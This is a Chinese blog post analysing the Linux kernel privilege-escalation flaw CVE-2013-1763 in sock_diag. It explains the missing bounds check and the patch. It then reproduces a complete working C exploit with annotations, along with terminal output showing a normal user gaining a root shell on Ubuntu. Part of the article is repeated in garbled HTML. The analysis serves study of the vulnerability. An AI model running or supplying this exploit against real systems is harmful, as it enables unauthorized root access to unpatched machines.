<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析 | Frank&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="kernel 最近出了一个新的本地提权安全漏洞CVE-2013-1763，影响范围比较广泛，ubuntu，Arch，fedora都受到其影响，漏洞刚公布就有牛人发布了利用该漏洞获取root权限的攻击代码，下面会分析该代码是如何获取root权限的。   首先对CVE-2013-1763这个安全漏洞简单介绍一下。   1.">
<meta name="keywords" content="系统安全">
<meta property="og:type" content="article">
<meta property="og:title" content="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析">
<meta property="og:url" content="https://fengguoqing.github.io/2013/08/22/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/index.html">
<meta property="og:site_name" content="Frank&#39;s Blog">
<meta property="og:description" content="kernel 最近出了一个新的本地提权安全漏洞CVE-2013-1763，影响范围比较广泛，ubuntu，Arch，fedora都受到其影响，漏洞刚公布就有牛人发布了利用该漏洞获取root权限的攻击代码，下面会分析该代码是如何获取root权限的。   首先对CVE-2013-1763这个安全漏洞简单介绍一下。   1. 漏洞描述 在net/core/sock_diag.c中，__sock_dia">
<meta property="og:updated_time" content="2017-11-25T10:41:07.675Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析">
<meta name="twitter:description" content="kernel 最近出了一个新的本地提权安全漏洞CVE-2013-1763，影响范围比较广泛，ubuntu，Arch，fedora都受到其影响，漏洞刚公布就有牛人发布了利用该漏洞获取root权限的攻击代码，下面会分析该代码是如何获取root权限的。   首先对CVE-2013-1763这个安全漏洞简单介绍一下。   1. 漏洞描述 在net/core/sock_diag.c中，__sock_dia">
  
    <link rel="alternate" href="/atom.xml" title="Frank&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Frank&#39;s Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://fengguoqing.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/08/22/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/" class="article-date">
  <time datetime="2013-08-22T06:07:12.000Z" itemprop="datePublished">2013-08-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p> kernel 最近出了一个新的本地提权安全漏洞<a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1763" target="_blank" rel="noopener">CVE-2013-1763</a>，影响范围比较广泛，ubuntu，Arch，fedora都受到其影响，漏洞刚公布就有牛人发布了利用该漏洞获取root权限的攻击代码，下面会分析该代码是如何获取root权限的。 </p>
<p> 首先对<a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1763" target="_blank" rel="noopener">CVE-2013-1763</a>这个安全漏洞简单介绍一下。 </p>
<p><span id="OSC_h4_1"></span></p>
<h4 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h4><p> 在net/core/sock_diag.c中，__sock_diag_rcv_msg函数未对sock_diag_handlers数组传入的下标做边界检查，导致可能越界，进而导致可执行代码的漏洞。没有root权限的用户可以利用该漏洞获取到root权限。 </p>
<p><span id="OSC_h4_2"></span></p>
<h4 id="2-漏洞的影响范围"><a href="#2-漏洞的影响范围" class="headerlink" title="2. 漏洞的影响范围"></a>2. 漏洞的影响范围</h4><p> linux kernel 3.0-3.7.10 </p>
<p><span id="OSC_h4_3"></span></p>
<h4 id="3-漏洞曝光时间"><a href="#3-漏洞曝光时间" class="headerlink" title="3. 漏洞曝光时间"></a>3. 漏洞曝光时间</h4><p> <span><span style="font-size:15px;font-family:Arial;background-color:transparent;vertical-align:baseline;">2013/02/19</span></span> </p>
<p><span id="OSC_h4_4"></span></p>
<h4 id="4-漏洞产生的原因"><a href="#4-漏洞产生的原因" class="headerlink" title="4. 漏洞产生的原因"></a>4. 漏洞产生的原因</h4><p> 首先看一下这个漏洞的patch： </p>
<pre><code>net/core/sock_diag.c View file @ 6e601a5
@@ -121,6 +121,9 @@ static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
   if (nlmsg_len(nlh) &amp;lt; sizeof(*req))
     return -EINVAL;

+  if (req-&amp;gt;sdiag_family &amp;gt;= AF_MAX)
+    return -EINVAL;
+
   hndl = sock_diag_lock_handler(req-&amp;gt;sdiag_family);
   if (hndl == NULL)
     err = -ENOENT;`&lt;/pre&gt; 

 &lt;span&gt;Patch 很简单，只是加上了数组边界判断而已。那么在看看sock_diag_lock_hander这个函数做了些什么：&lt;/span&gt; 

 &lt;span&gt; &lt;/span&gt; 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`static const inline struct sock_diag_handler *sock_diag_lock_handler(int family)
{
        if (sock_diag_handlers[family] == NULL)
                request_module(&quot;net-pf-%d-proto-%d-type-%d&quot;, PF_NETLINK,
                                NETLINK_SOCK_DIAG, family);

        mutex_lock(&amp;amp;sock_diag_table_mutex);
        return sock_diag_handlers[family];//这个函数没有对传入的family的值的范围,进行验证,从而造成数组越界.
}`&lt;/pre&gt; 这个函数也没有做什么，只是对 
&lt;span&gt;sock_diag_lock_hander[family]进行检测，是否为NULL，如果为NULL申请注册，然后加上了一把锁，最后返回的是它的地址。&lt;/span&gt; 

 &lt;span&gt; &lt;/span&gt; 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`static struct sock_diag_handler *sock_diag_handlers[AF_MAX];  //可以看出,这个指针数组最大为AF_MAX AF_MAX = 40.`&lt;/pre&gt; 

 接着我们再看看完整的__sock_diag_rcv_msg函数。 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
{
    int err;
    struct sock_diag_req *req = NLMSG_DATA(nlh);
    struct sock_diag_handler *hndl;

    if (nlmsg_len(nlh) &amp;lt; sizeof(*req))
        return -EINVAL;

    hndl = sock_diag_lock_handler(req-&amp;gt;sdiag_family);//这里传入sdiag_family的值,然后返回数组指针sock_diag_handlers[reg-&amp;gt;sdiag_family].由于没有做边界判断，那么就可以越界。
    if (hndl == NULL)
        err = -ENOENT;
    else
        err = hndl-&amp;gt;dump(skb, nlh); //看到这里是不是很激动呢，利用这里可以让它执行我们自己的代码
    sock_diag_unlock_handler(hndl);
    return err;
}`&lt;/pre&gt; 
&lt;span id=&quot;OSC_h4_5&quot;&gt;&lt;/span&gt;

####  5\. 漏洞的利用 

 虽然已经找到了kernel中有这样一个漏洞，但是如何利用这个漏洞来执行我们自己的程序，取得root权限还是需要很困难的，需要对kernel系统以及计算机运行原理非常了解才可以，并且这些程序往往需要精细设计才能达到最终的目的。 下面是某牛人写的exploit代码，请欣赏： 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`/* 
* quick&apos;n&apos;dirty poc for CVE-2013-1763 SOCK_DIAG bug in kernel 3.3-3.8
* bug found by Spender
* poc by SynQ
* 
* hard-coded for 3.5.0-17-generic #28-Ubuntu SMP Tue Oct 9 19:32:08 UTC 2012 i686 i686 i686 GNU/Linux
* using nl_table-&amp;gt;hash.rehash_time, index 81
* 
* Fedora 18 support added
* 
* 2/2013
*/

#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;linux/netlink.h&amp;gt;
#include &amp;lt;netinet/tcp.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;linux/if.h&amp;gt;
#include &amp;lt;linux/filter.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;linux/sock_diag.h&amp;gt;
#include &amp;lt;linux/inet_diag.h&amp;gt;
#include &amp;lt;linux/unix_diag.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long sock_diag_handlers, nl_table;

int __attribute__((regparm(3)))    //这是指示GCC编译器选用3个寄存器代替堆栈来传递参数。
kernel_code()
{
    commit_creds(prepare_kernel_cred(0));  //这行代码执行之后就可以获取root权限，但是这两个函数都是内核函数，必须在内核态执行才有效。
    return -1;
}

//这段函数没有使用，用来解释hard code jump[] 为什么是那些数值
int jump_payload_not_used(void *skb, void *nlh)
{
    asm volatile (
        &quot;mov $kernel_code, %eax\n&quot;
        &quot;call *%eax\n&quot;
    );
}

unsigned long
get_symbol(char *name)  //为了获取内核函数地址
{
    FILE *f;
    unsigned long addr;
    char dummy, sym[512];
    int ret = 0;

    f = fopen(&quot;/proc/kallsyms&quot;, &quot;r&quot;);
    if (!f) {
        return 0;
    }

    while (ret != EOF) {
        ret = fscanf(f, &quot;%p %c %s\n&quot;, (void **) &amp;amp;addr, &amp;amp;dummy, sym);
        if (ret == 0) {
            fscanf(f, &quot;%s\n&quot;, sym);
            continue;
        }
        if (!strcmp(name, sym)) {
            printf(&quot;[+] resolved symbol %s to %p\n&quot;, name, (void *) addr);
            fclose(f);
            return addr;
        }
    }
    fclose(f);

    return 0;
}

int main(int argc, char*argv[])
{
    int fd;
    unsigned family;
    struct {
        struct nlmsghdr nlh;  //socket协议netlink数据包的格式
        struct unix_diag_req r;
    } req;
    char    buf[8192];

    //创建一个netlink协议的socket，因为__sock_diag_rcv_msg函数是属于NETLINK_SOCK_DIAG的
    if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) &amp;lt; 0){
        printf(&quot;Can&apos;t create sock diag socket\n&quot;);
        return -1;
    }

    //填充数据包，就是为了最终能够执行到__sock_diag_rcv_msg中去
    memset(&amp;amp;req, 0, sizeof(req));
    req.nlh.nlmsg_len = sizeof(req);
    req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
    req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
    req.nlh.nlmsg_seq = 123456;

    //req.r.sdiag_family = 89;
    req.r.udiag_states = -1;
    req.r.udiag_show = UDIAG_SHOW_NAME | UDIAG_SHOW_PEER | UDIAG_SHOW_RQLEN;

    if(argc==1){
        printf(&quot;Run: %s Fedora|Ubuntu\n&quot;,argv[0]);
        return 0;
    }
    else if(strcmp(argv[1],&quot;Fedora&quot;)==0){
      commit_creds = (_commit_creds) get_symbol(&quot;commit_creds&quot;);
      prepare_kernel_cred = (_prepare_kernel_cred) get_symbol(&quot;prepare_kernel_cred&quot;);
      sock_diag_handlers = get_symbol(&quot;sock_diag_handlers&quot;);
      nl_table = get_symbol(&quot;nl_table&quot;);

      if(!prepare_kernel_cred || !commit_creds || !sock_diag_handlers || !nl_table){
        printf(&quot;some symbols are not available!\n&quot;);
        exit(1);
        }

      family = (nl_table - sock_diag_handlers) / 4;
      printf(&quot;family=%d\n&quot;,family);
      req.r.sdiag_family = family;

      if(family&amp;gt;255){
        printf(&quot;nl_table is too far!\n&quot;);
        exit(1);
        }
    }
    else if(strcmp(argv[1],&quot;Ubuntu&quot;)==0){
      commit_creds = (_commit_creds) 0xc106bc60;
      prepare_kernel_cred = (_prepare_kernel_cred) 0xc106bea0;
      req.r.sdiag_family = 81;
    }

    unsigned long mmap_start, mmap_size;
    mmap_start = 0x10000;  //选择了一块1MB多的内存区域
    mmap_size = 0x120000;  
    printf(&quot;mmapping at 0x%lx, size = 0x%lx\n&quot;, mmap_start, mmap_size);

        if (mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,
                MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {
                printf(&quot;mmap fault\n&quot;);
                exit(1);
        }
    memset((void*)mmap_start, 0x90, mmap_size);         //将其全部填充为0x90，在X86系统中对应的是NOP指令

    char jump[] = &quot;\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3&quot;; // jump_payload in asm
    unsigned long *asd = &amp;amp;jump[4];
    *asd = (unsigned long)kernel_code; //使用kernel_code函数的地址替换掉jump[]中的0x11

    //将jump这段代码放在mmap内存区域的最后，也就是说只要最后能够跳转到这块区域，就可以执行到jump代码，进而跳转执行kernel_code，因为这块区域中布满了NOP指令。
    memcpy( (void*)mmap_start+mmap_size-sizeof(jump), jump, sizeof(jump));

    //所有准备工作完成之后，最后在这里发送socket触发这个漏洞
    if ( send(fd, &amp;amp;req, sizeof(req), 0) &amp;lt; 0) {
        printf(&quot;bad send\n&quot;);
        close(fd);
        return -1;
    }

    printf(&quot;uid=%d, euid=%d\n&quot;,getuid(), geteuid() );

    if(!getuid())
        system(&quot;/bin/sh&quot;);
}`&lt;/pre&gt; 
&lt;span id=&quot;OSC_h4_6&quot;&gt;&lt;/span&gt;

####  6\. exploit代码分析 

 在分析之前，有些概念要澄清一下，在linux系统中，用户空间和内核空间是独立存在的。在一个32位的linux系统中，每个进程会虚拟出4G的内存空间，其中3G是用户空间，1G是内核空间，用户空间的地址范围是0×00000000 到 0xBFFFFFFF，内核空间的地址是0xC0000000 到&amp;nbsp;0xFFFFFFFF。内核地址空间由所有进程共享，但只有运行在内核态的进程才能访问，用户进程可以通过系统调用切换到内核态访问内核空间，进程运行在内核态时所产生的地址都属于内核空间。 

 commit_creds 和prepare_kernel_cred 均为内核函数，如果要执行他们就应该切换到内核状态运行。当执行内核函数__sock_diag_rcv_msg是处于内核态的，所以这个时候调用执行kernel_code函数就可以取得root权限。 

 那么如何调用kernel_code函数呢？所有我们mmap了一块从0x10000开始0x120000大小的内存空间，然后将这块空间写满NOP指令，将跳转执行kernel_code的代码放在这块区域的最后面，也就是说，只要跳转执行到这块内存区域的（除了jump代码块内部）都会顺利跑到kernel_code函数。这种方法叫做NOP slide，就像坐滑滑梯一样，自然滑到底部。jump这一段代码的分析如下： 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`char jump[] = &quot;\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3&quot;; // jump_payload in asm
    unsigned long *asd = &amp;amp;jump[4];
    *asd = (unsigned long)kernel_code;

int jump_payload_not_used(void *skb, void *nlh)
{
    asm volatile (
        &quot;mov $kernel_code, %eax\n&quot;
        &quot;call *%eax\n&quot;
    );
}

fengguoqing@VirtualBox:~/Downloads$ gcc CVE-2013-1763.c
CVE-2013-1763.c: In function ‘main’:
CVE-2013-1763.c:148:26: warning: initialization from incompatible pointer type [enabled by default]
fengguoqing@VirtualBox:~/Downloads$ objdump -D a.out
….
08048763 &amp;lt;jump_payload_not_used&amp;gt;:
 8048763:    55                       push   %ebp
 8048764:    89 e5                    mov    %esp,%ebp
 8048766:    b8 3c 87 04 08           mov    $0x804873c,%eax
 804876b:    ff d0                    call   *%eax
 804876d:    5d                       pop    %ebp
 804876e:    c3                       ret   
….

(gdb) p/x jump
$2 = {0x55, 0x89, 0xe5, 0xb8, 0x3c, 0x87, 0x4, 0x8, 0xff, 0xd0, 0x5d, 0xc3, 0x0} //最后发现0x11被填充成了kernel_code的地址
(gdb) p kernel_code
$4 = {int ()} 0x804873c &amp;lt;kernel_code&amp;gt;`&lt;/pre&gt; 

 问题的关键变成了如何才能跳转到这一块内存区域呢？&lt;span style=&quot;line-height:1.5;font-size:10pt;&quot;&gt;先看看下面这结构体的定义：&lt;/span&gt; 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`struct nlmsghdr {
      __u32       nlmsg_len;  /* Length of message including header */
      __u16       nlmsg_type; /* Message content */
      __u16       nlmsg_flags;    /* Additional flags */
      __u32       nlmsg_seq;  /* Sequence number */
      __u32       nlmsg_pid;  /* Sending process port ID */
  };

  struct unix_diag_req {
      __u8    sdiag_family;
      __u8    sdiag_protocol;
      __u16   pad;
      __u32   udiag_states;
      __u32   udiag_ino;
      __u32   udiag_show;
      __u32   udiag_cookie[2];
  };

struct sock_diag_handler {
        __u8 family;//
        int (*dump)(struct sk_buff *skb, struct nlmsghdr *nlh);
};

 struct netlink_table {
         struct nl_portid_hash   hash; //取回这个值
         struct hlist_head       mc_list;
         struct listeners __rcu  *listeners;
         unsigned int            flags;
         unsigned int            groups;
         struct mutex            *cb_mutex;
         struct module           *module;
         void                    (*bind)(int group);
         int                     registered;
 };

 struct nl_portid_hash {
         struct hlist_head       *table; 四个字节
         unsigned long           rehash_time; //也是四个字节.0x00012b59//这个值在我们的那个范围内.

         unsigned int            mask;
         unsigned int            shift;

         unsigned int            entries;
         unsigned int            max_shift;

         u32                     rnd;
 };

static struct netlink_table *nl_table;`&lt;/pre&gt; 

 我们的牛人发现了nl_table里面有一个变量rehash_time的值正好在0x10000-0x130000这个区域内，所以可以利用这个值来跳转，只需要将sock_diag_handlers[sdiag_family]-dump正好落在这个值上就可以了。如下图所示 

 ![](http://static.oschina.net/uploads/space/2013/0822/112058_77C0_579952.jpg) 

 所以我们需要先知道nl_table和&lt;span&gt;sock_diag_handlers的地址，可以通过以下两种方式查看。&lt;/span&gt; 

 &lt;span&gt; &lt;/span&gt; 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`cat /proc/kallsyms
sudo cat /boot/System.map-3.2.0-43-generic-pae`&lt;/pre&gt; 但是在ubuntu系统中前一种方法无法查看到变量函数的地址，所以只有使用第二种方法了，由于 
&lt;span&gt;nl_table和&lt;/span&gt; 
&lt;span&gt;sock_diag_handlers都是指针，所以他们的大小都是4个字节。于是就可以计算出&lt;/span&gt; 
&lt;span&gt;sdiag_family的取值了。&lt;/span&gt; 

 &lt;span&gt; &lt;/span&gt; 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep nl_table
c189b5c0 d nl_table_lock
c189b5c4 d nl_table_wait
c1a488e0 b nl_table_users
c1a488e4 b nl_table
fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep sock_diag_handlers
c1a487a0 b sock_diag_handlers
(0xc1a488e4 - 0xc1a487a0) / 4 = 81L`&lt;/pre&gt; 至此所有的谜题都解开了，然后就可以高高兴兴的黑自己一把了: 

 &lt;span style=&quot;line-height:1.5;font-size:10pt;&quot;&gt; &lt;/span&gt; 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`fengguoqing@VirtualBox:~/Downloads$ gcc -o CVE-2013-1763 CVE-2013-1763.c
CVE-2013-1763.c: In function ‘main’:
CVE-2013-1763.c:148:26: warning: initialization from incompatible pointer type [enabled by default]
fengguoqing@VirtualBox:~/Downloads$ id
uid=1000(fengguoqing) gid=1000(fengguoqing) groups=1000(fengguoqing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)
fengguoqing@VirtualBox:~/Downloads$ ./CVE-2013-1763 Ubuntu
mmapping at 0x10000, size = 0x120000
uid=0, euid=0
# id
uid=0(root) gid=0(root) groups=0(root)
#
</code></pre><p> 由于在sock_diag_lock_handler中有mutex_lock(&amp;sock_diag_table_mutex)，但是我们在后面将程序引入到其他地方，并没有接着执行<br><span>mutex_unlock(&amp;sock_diag_table_mutex)</span>，所以按道理只能root成功一次，但是我在测试中发现有时候可以root多次，有时候root一次之后就不能再root了，需要重启才可以重新root。<br><span id="OSC_h4_7"></span></p>
<h4 id="7-参考网站"><a href="#7-参考网站" class="headerlink" title="7. 参考网站"></a><span style="font-size:10pt;line-height:1.5;">7. 参考网站</span></h4><p> CVE：<span></span> </p>
<p> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1763" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1763</a> </p>
<p> NVD: </p>
<p> <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1763" target="_blank" rel="noopener">http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1763</a> </p>
<p> <span>Patch:</span> </p>
<p> <a href="http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0" target="_blank" rel="noopener">CONFIRM:http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0</a> </p>
<p> Exploit: </p>
<p> <a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com</a> </p>
<p> 维基百科Netlink： </p>
<p> <a href="http://zh.wikipedia.org/wiki/Netlink" target="_blank" rel="noopener">http://zh.wikipedia.org/wiki/Netlink<span style="line-height:1.5;font-size:10pt;"></span></a> font-size: 14px; line-height: 19px;”&gt;所以我们需要先知道nl_table和sock_diag_handlers的地址，可以通过以下两种方式查看。 </p>
<pre><code>&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;`cat /proc/kallsyms
sudo cat /boot/System.map-3.2.0-43-generic-pae`&lt;/pre&gt; 

 &lt;span style=&quot; color: rgb(19, 37, 60); line-height: 19px;&quot;&gt;但是在ubuntu系统中前一种方法无法查看到变量函数的地址，所以只有使用第二种方法了，由于&amp;nbsp;nl_table和&amp;nbsp;sock_diag_handlers都是指针，所以他们的大小都是4个字节。于是就可以计算出&amp;nbsp;sdiag_family的取值了。&lt;/span&gt;

&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;`fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep nl_table
c189b5c0 d nl_table_lock
c189b5c4 d nl_table_wait
c1a488e0 b nl_table_users
c1a488e4 b nl_table
fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep sock_diag_handlers
c1a487a0 b sock_diag_handlers
(0xc1a488e4 - 0xc1a487a0) / 4 = 81L`&lt;/pre&gt; 

 &lt;span style=&quot;color: rgb(19, 37, 60); line-height: 19px;&quot;&gt;至此所有的谜题都解开了，然后就可以高高兴兴的黑自己一把了:&lt;/span&gt;

&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;`fengguoqing@VirtualBox:~/Downloads$ gcc -o CVE-2013-1763 CVE-2013-1763.c
CVE-2013-1763.c: In function ‘main’:
CVE-2013-1763.c:148:26: warning: initialization from incompatible pointer type [enabled by default]
fengguoqing@VirtualBox:~/Downloads$ id
uid=1000(fengguoqing) gid=1000(fengguoqing) groups=1000(fengguoqing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)
fengguoqing@VirtualBox:~/Downloads$ ./CVE-2013-1763 Ubuntu
mmapping at 0x10000, size = 0x120000
uid=0, euid=0
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre><p> <span style=" color: rgb(19, 37, 60); line-height: 19px;">由于在sock_diag_lock_handler中有mutex_lock(&amp;sock_diag_table_mutex)，但是我们在后面将程序引入到其他地方，并没有接着执行&nbsp;mutex_unlock(&amp;sock_diag_table_mutex)，所以按道理只能root成功一次，但是我在测试中发现有时候可以root多次，有时候root一次之后就不能再root了，需要重启才可以重新root。</span></p>
<p> <span style=" color: rgb(19, 37, 60);">7.&nbsp;参考网站</span> </p>
<p> <span style="color: rgb(19, 37, 60); font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; font-size: 12px; line-height: 19px; ">CVE：</span><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1763" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename…=CVE-2013-1763</a> </p>
<p> <span style="color: rgb(19, 37, 60); font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; font-size: 12px; line-height: 19px;">NVD:&nbsp;</span><a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1763" target="_blank" rel="noopener">http://web.nvd.nist.gov/view/vuln/de…=CVE-2013-1763</a> </p>
<p> <span style="color: rgb(19, 37, 60); font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; font-size: 12px; line-height: 19px; ">Patch:&nbsp;CONFIRM:</span><a href="http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0" target="_blank" rel="noopener">http://git.kernel.org/?p=linux/kerne…e0b6894ffd79c0</a> </p>
<p> <span style="color: rgb(19, 37, 60); font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; font-size: 12px; line-height: 19px; ">Exploit:&nbsp;</span><a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com</a> </p>
<p> <span style="color: rgb(19, 37, 60); font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; font-size: 12px; line-height: 19px; ">维基百科Netlink：</span><a href="http://zh.wikipedia.org/wiki/Netlink" target="_blank" rel="noopener">http://zh.wikipedia.org/wiki/Netlink</a><span style="color: rgb(19, 37, 60); font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; font-size: 12px; line-height: 19px; ">&nbsp;</span> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://fengguoqing.github.io/2013/08/22/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/" data-id="cjafiicoq0000rxj15p39vzy4" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/系统安全/">系统安全</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2013/08/29/如何架设Git服务器/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          如何架设Git服务器
        
      </div>
    </a>
  
  
    <a href="/2013/06/22/建立网站的一般步骤/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">建立网站的一般步骤</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux内核调试/">Linux内核调试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux移植/">linux移植</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/功耗/">功耗</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/教程/">教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/日常记录/">日常记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/系统安全/">系统安全</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Linux内核调试/" style="font-size: 10px;">Linux内核调试</a> <a href="/tags/linux移植/" style="font-size: 15px;">linux移植</a> <a href="/tags/功耗/" style="font-size: 15px;">功耗</a> <a href="/tags/教程/" style="font-size: 20px;">教程</a> <a href="/tags/日常记录/" style="font-size: 15px;">日常记录</a> <a href="/tags/系统安全/" style="font-size: 15px;">系统安全</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">April 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/02/">February 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">December 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/08/">August 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/06/">June 2013</a></li><li 